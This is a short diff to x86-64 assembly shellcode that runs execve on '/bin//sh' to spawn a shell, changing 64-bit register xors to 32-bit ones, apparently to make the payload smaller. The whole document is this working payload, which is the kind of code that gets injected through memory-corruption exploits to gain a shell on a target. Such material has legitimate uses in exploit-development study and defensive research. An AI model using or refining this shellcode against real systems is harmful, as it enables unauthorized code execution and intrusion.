@@ -8,13 +8,13 @@ BITS 64
 global main
 
 main:
-	xor  rax, rax
+	xor  eax, eax
 	push rax
 	mov  rdi, 0x68732f2f6e69622f ;/bin//sh
 	push rdi
 	mov  al,  execve
 	mov  rdi, rsp
-	xor  rsi, rsi
-	xor  rdx, rdx
+	xor  esi, esi
+	xor  edx, edx
 	syscall
 
